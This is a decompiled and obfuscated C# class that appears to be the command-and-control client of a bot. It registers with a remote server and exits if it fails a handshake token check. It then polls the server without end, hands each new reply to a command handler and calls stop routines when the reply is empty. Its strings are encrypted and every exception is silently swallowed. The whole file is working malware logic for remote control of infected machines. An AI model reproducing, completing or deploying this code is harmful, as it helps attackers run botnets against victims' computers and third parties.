using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using ns1;

namespace ns0;

internal class Class1 : Class0
{
	private static string string_0 = string.Empty;

	public static void smethod_0()
	{
		smethod_1();
		Thread thread = new Thread(smethod_2);
		thread.Start();
	}

	private static void smethod_1()
	{
		string a_ = _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_12() + Class2.string_3 + _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_13() + Class2._0024FD_0024A;
		while (true)
		{
			try
			{
				string text = smethod_3(Class2.string_2, a_);
				if (text.Length > 0)
				{
					if (text == Class2.string_1)
					{
						break;
					}
					Environment.Exit(0);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.int_0 * 1000);
		}
	}

	private static void smethod_2()
	{
		string a_ = _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_14() + Class2.string_3;
		while (true)
		{
			try
			{
				string text = smethod_3(Class2.string_2, a_);
				if (text.Length > 0)
				{
					if (text == _003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_15())
					{
						string_0 = string.Empty;
						smethod_0();
						break;
					}
					if (text != string_0)
					{
						string_0 = text;
						Class0._0024MD_00242C(text);
					}
				}
				else
				{
					Class3.smethod_1();
					Class4.smethod_1();
					Class5.smethod_1();
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.int_0 * 1000);
		}
	}

	private static string smethod_3(string string_1, string A_1)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		ServicePointManager.set_Expect100Continue(false);
		HttpWebRequest val = (HttpWebRequest)WebRequest.Create(string_1);
		((WebRequest)val).set_ContentType(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_16());
		((WebRequest)val).set_Method(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_17());
		val.set_UserAgent(Class2.string_1);
		byte[] bytes = Encoding.Default.GetBytes(A_1);
		((WebRequest)val).set_ContentLength((long)bytes.Length);
		Stream requestStream = ((WebRequest)val).GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = ((WebRequest)val).GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd();
	}
}
